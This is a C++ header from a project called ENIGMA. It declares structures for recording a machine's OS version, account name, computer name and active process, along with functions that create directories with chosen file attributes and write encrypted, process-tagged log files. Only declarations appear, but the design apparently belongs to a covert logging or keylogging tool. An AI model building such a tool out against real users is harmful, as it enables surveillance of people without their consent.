#ifndef ENIGMA__STREAM_H_
#define ENIGMA__STREAM_H_

#include <filesystem>
#include <fstream>
#include <sstream>
#include <rpc.h>
#include <lmcons.h>

#include "helper.h"
#include "encrypt.h"

struct ClientInfo {
  OSVERSIONINFO osVersionInfo;
  char accountName[UNLEN + 1];
  char computerName[UNLEN + 1];
  uint32_t activeProcess = 0x0;

} static clientInfo;

struct Directory {
  std::string name;
  std::string path;
};

namespace Stream {
class LogFile {
 public:
  std::ofstream Ofstream;
  std::string Name;
  std::string Path;
  std::string PathFull;

  LogFile(const std::string &path, const std::string &name);
  LogFile();
};

std::string GetPath(const std::string &dir = "");
bool MakeDir(const std::string &path, const std::string &name, DWORD fileAttribute = FILE_ATTRIBUTE_NORMAL);
LogFile MakeFile(const std::string &fileName, const std::string &path);
bool WriteLog(const std::string &input, int active, LogFile &logFile, bool blockProcessInfo = false);
void GetAccountInfo(ClientInfo data);
}

#endif //ENIGMA__STREAM_H_
